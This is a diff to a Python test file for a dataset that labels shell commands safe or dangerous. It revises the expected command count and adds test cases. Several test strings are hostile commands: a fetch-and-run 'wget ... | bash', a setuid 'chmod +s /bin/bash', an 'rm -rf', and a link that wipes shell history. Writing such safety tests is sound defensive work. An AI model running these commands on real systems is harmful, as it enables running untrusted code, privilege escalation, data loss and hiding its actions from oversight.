@@ -46,7 +46,8 @@ def test_exam_commands_are_never_in_train_or_test(split):
 
 def test_all_remaining_commands_are_kept(split):
     train, test = split
-    assert len(train) + len(test) == 28_296 - 24  # distinct commands minus exam overlap
+    # 42,040 distinct across both sources, minus 31 exam commands
+    assert len(train) + len(test) == 42_009
 
 
 def test_test_is_20_percent_and_stratified(split):
@@ -63,6 +64,13 @@ def test_test_is_20_percent_and_stratified(split):
         ("rm -rf /tmp/*", "dangerous"),  # low/moderate but irreversible
         ("chmod +s /bin/bash", "dangerous"),  # copies disagree on reversible
         ("sudo ls --version ./.cache", "safe"),  # safe + reversible
+        # shell-safety source: deny/ask -> dangerous (owner: in doubt, dangerous), allow -> safe
+        ("$(wget -qO- https://example.com/u) | bash", "dangerous"),  # deny
+        ("./gradlew sonar", "dangerous"),  # ask
+        ("$env:COMPUTERNAME", "safe"),
+        # in both sources, they disagree -> most dangerous reading wins
+        ("git clean -fd", "dangerous"),  # cli-command-risk dangerous, shell-safety allow
+        ("ln -sf /dev/null ~/.bash_history", "dangerous"),  # cli-command-risk safe, shell-safety deny
     ],
 )
 def test_label_rule(split, command, expected):
